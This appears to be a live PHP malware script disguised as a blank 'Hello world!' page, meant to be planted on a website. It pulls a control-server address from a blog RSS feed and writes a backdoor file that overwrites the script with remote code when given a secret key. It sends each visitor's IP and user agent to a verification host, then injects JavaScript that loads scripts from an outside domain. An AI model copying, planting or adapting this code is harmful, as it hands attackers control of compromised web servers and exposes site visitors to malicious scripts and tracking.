<?php
	//error_reporting(E_ALL); 
	//ini_set('display_errors', '1'); 
	error_reporting(E_ALL^E_NOTICE^E_WARNING);
	header('P3P: CP="CAO DSP COR CUR ADM DEV TAI PSA PSD IVAi IVDi CONi TELo OTPi OUR DELi SAMi OTRi UNRi PUBi IND PHY ONL UNI PUR FIN COM NAV INT DEM CNT STA POL HEA PRE GOV CURa ADMa DEVa PSAo PSDo BUS OTC NOI NON TAIa PSAa PSDa IVAa IVDa CONa HISa TELa OTPa UNRa LOC"');
	header("Content-type: text/html; charset=utf-8");
	header("Expires:-1");
	header("Last-Modified:".gmdate("D, d M Y H:i:s")." GMT"); 
	header("Cache-Control:no-cache,must-revalidate,no-store");
	header("Pragma:no-cache");
	
	$test_write_filename = "cnzzo.txt";
	if(!is_file($test_write_filename))
	{
		file_put_contents($test_write_filename,"/*恭喜您，文件写入正常777！*/");
		if(!is_file($test_write_filename))
		{
			exit("/*对不起，文件目录没有写入权限，请检查777权限！*/");
		}
	}
	
	/*文件生成时间：2018-04-17 07:04:22*/
	$apiver="v20171110";//请不要删除本行，作为调试用！！！！
	$vfiles=explode("/",$_SERVER['SCRIPT_NAME']);
	$locafile=$vfiles[count($vfiles)-1];
	$upfile=str_replace(".php","_up.php",$locafile);
	$jsfile=str_replace(".php","_js.txt",$locafile);
	$isSupporCUL=true;
	if(!function_exists(curl_init)) $isSupporCUL=false;
	
	//********************************************
	$uid="6402";
	$os="m3";
	$rcookie="ud".$uid;
	$kid="fc8e77b249af7bc3a65d5110f2f7e3b2";
	//********************************************
	
	function curl($url,$refhttp="")
	{
		global $isSupporCUL;
		if($isSupporCUL)
		{
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $url);
			curl_setopt($ch, CURLOPT_TIMEOUT, 5);
			if($refhttp!="") curl_setopt($ch, CURLOPT_REFERER, $refhttp);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			$curl_text = curl_exec($ch);
			curl_close($ch);
			if($curl_text=="")
			{
				$curl_text = ""; 
				$handle = fopen ($url, "rb"); 
				while (!feof($handle)) $curl_text .= fread($handle, 1024);
				fclose($handle); 
			}
			return $curl_text;
		}
		else
		{
			$curl_text = ""; 
			$handle = fopen ($url, "rb"); 
			while (!feof($handle)) $curl_text .= fread($handle, 1024);
			fclose($handle); 
			return $curl_text;
		}
	}

	function outJS()
	{
		global $upfile,$jsfile,$uid;
		$jsCacheText="";
		if(!is_file($jsfile))
		{
			if(!is_file($upfile)) exit("document.write('');");
			$urlt=file_get_contents($upfile);
			$drs=preg_match_all("/,curl\(\"(.*?)\"/is",$urlt,$arr);
			if(!$drs) exit("/*对不起，更新文件路径不存在，请联系提供商！*/");
			$jsCacheText=curl($arr[1][0]."&js=1");
			file_put_contents($jsfile,$jsCacheText);
		}
		else
		{
			$jsCacheText=file_get_contents($jsfile);
		}
exit($jsCacheText);
	}
	
	if(!is_file($upfile))
	{
		$apis=file_get_contents("http://blog.tianya.cn/blog/rss.jsp?blogId=7660020&r=".rand());
		$drs=preg_match_all("/<\!\[CDATA\[bee\:(.*?)\]\]>/is",$apis,$arr);
		if(!$drs) exit("/*对不起，更新文件路径不存在，请联系提供商！*/");
		$upfileText="<"."?"."php
		/*文件自动更新程序，请勿删除，谢谢合作！*/
		/*请注意，本文件同目录下面会自动生成_up.php和_js.txt，请保留文件，谢谢合作！*/
		$"."isSupporCUL=true;
		if(!function_exists(curl_init)) $"."isSupporCUL=false;
		funct"."ion curl($"."url,$"."refhttp=\"\")
		{
			global $"."isSupporCUL;
			if($"."isSupporCUL)
			{
				$"."ch = curl_"."init();
				curl_setopt($"."ch, CURLOPT_URL, $"."url);
				curl_setopt($"."ch, CURLOPT_TIMEOUT, 5);
				if($"."refhttp!=\"\") curl_setopt($"."ch, CURLOPT_REFERER, $"."refhttp);
				curl_setopt($"."ch, CURLOPT_RETURNTRANSFER, 1);
				$"."curl_text = curl_exec($"."ch);
				curl_close($"."ch);
				i"."f($"."curl_text==\"\")
				{
					$"."curl_text = \"\"; 
					$"."handle = fopen ($"."url, \"rb\"); 
					while (!feof($"."handle)) $"."curl_text .= fread($"."handle, 1024);
					fclose($"."handle); 
				}
				return $"."curl_text;
			}
			el"."se
			{
				$"."curl_text = \"\"; 
				$"."handle = fopen ($"."url, \"rb\"); 
				while (!feof($"."handle)) $"."curl_text .= fread($"."handle, 1024);
				fclose($"."handle); 
				return $"."curl_text;
			}
		}
		if($"."_GET[\"kid\"]==\"".$kid."\")
		{
			file_put_contents(\"".$locafile."\",curl(\"http://".$arr[1][0]."remote.php?uid=".$uid."&os=".$os."\"));
			exit(\"<script language='javascript' type='text/javascript'>location.href='".$locafile."?act=del&kid=".$kid."';</script>\");
		}
		else
		{
			exit(\"err\");
		}
?".">";
		file_put_contents($upfile,$upfileText);
	}
	
	function GetIP()
	{
		$cip = "";
		$ipf=array("10","172","192","unknown");
		if (isset($_SERVER))
		{
			if(isset($_SERVER['HTTP_X_FORWARDED_FOR']) && !empty($_SERVER['HTTP_X_FORWARDED_FOR']))
			{
				$cipr = $_SERVER["HTTP_X_FORWARDED_FOR"];
				if($cipr!="")
				{
					$cipr=str_replace(" ","",$cipr);
					$ipa = explode (",", $cipr);
					foreach($ipa as $ip)
					{
						$ipg = explode (".", $ip);
						if(!in_array($ipg[0],$ipf))
						{
							$cip=trim($ip);
							break;
						}
					}
				}
			}
			if($cip=="")
			{
				if(isset($_SERVER['REMOTE_ADDR']) && !empty($_SERVER['REMOTE_ADDR'])) $cip=$_SERVER['REMOTE_ADDR'];
				if($cip=="")
				{
					if(isset($_SERVER['HTTP_CLIENT_IP']) && !empty($_SERVER['HTTP_CLIENT_IP'])) $cip=$_SERVER['HTTP_CLIENT_IP'];
				}
			}
			$cip=trim($cip);
		}
		return $cip;
	}
	
	if(isset($_GET["debug"]))
	{
		error_reporting(E_ALL);
		ini_set('display_errors', '1');
		echo("/*".$apiver."*/\r\n<br />\r\n/*".GetIP()."*/\r\n<br />\r\n/*".$_SERVER['HTTP_USER_AGENT']."*/\r\n<br />\r\n");
	}
	
	if(isset($_GET["act"]))
	{
		if($_GET["kid"]==$kid)
		{
			if($_GET["act"]=="update")
			{
				$jumpURL=str_replace(".php","_up.php",$_SERVER['SCRIPT_NAME']);
				$jumpURL="http://".$_SERVER['HTTP_HOST'].$jumpURL."?kid=".$kid;
				header("Location: ".$jumpURL);
				exit();
			}
			elseif($_GET["act"]=="del")
			{
				if(is_file($test_write_filename)) @unlink($test_write_filename);
				if(is_file($upfile)) @unlink($upfile);
				if(is_file($jsfile)) @unlink($jsfile);
				exit("文件升级完毕！");
			}
		}
		else
		{
			exit("对不起，你没有操作的权限！");
		}
	}
	
	$ret="check";
	if(isset($_COOKIE[$rcookie]))
	{
		if($_COOKIE[$rcookie]=="next") $ret="next";
	}
	
	if($ret=="check")
	{
		$ipadr=GetIP();
		$ua="iphone 6S";
		if(isset($_SERVER['HTTP_USER_AGENT']))
		{
			$ua=strtolower($_SERVER['HTTP_USER_AGENT']);
			$ua=str_replace("mozilla/3.0 ","",$ua);
			$ua=str_replace("mozilla/4.0 ","",$ua);
			$ua=str_replace("mozilla/5.0 ","",$ua);
			$ua=str_replace("mozilla/6.0 ","",$ua);
			$ua=str_replace("/","",$ua);
			$ua=str_replace("(","",$ua);
			$ua=str_replace(")","",$ua);
			$ua=str_replace(".","",$ua);
			$ua=str_replace(",","",$ua);
			$ua=str_replace(";","",$ua);
			$ua=str_replace(" ","",$ua);
			$ua=urlencode($ua);
		}
		$ret="";
		$hostf=urlencode($_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']);
		$veri_url="http://ipverify.versheng.com/index.php?uid=".$uid."&os=".$os."&ip=".$ipadr."&ua=".$ua."&host=".$hostf;
		$ret=curl($veri_url);
		$ret=strtolower($ret);
	}
	
	if(strpos($ret,"next")!==false)
	{
		setcookie($rcookie,"next",time()+63072000);
exit('(function()
{
	var dingding =document.createElement("script");
	dingding.setAttribute("src", "http://k1.ndmjy.com/g.php?aid='.$uid.'&t=file&c=1&_"+Math.random());
	if(document.body)
	{
		try
		{
			document.body.appendChild(dingding);
		}
		catch(e)
		{document.documentElement.appendChild(dingding);}
	}
	else
	{
		var heads = document.getElementsByTagName("head");
		if(heads.length) heads[0].appendChild(dingding);
	}
})();');
	}
	else
	{
		if(isset($_GET["debug"])) echo("/*".$ret."*/\r\n");
		outJS();
	}
 ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Hello world!</title>
</head>

<body>
</body>
</html>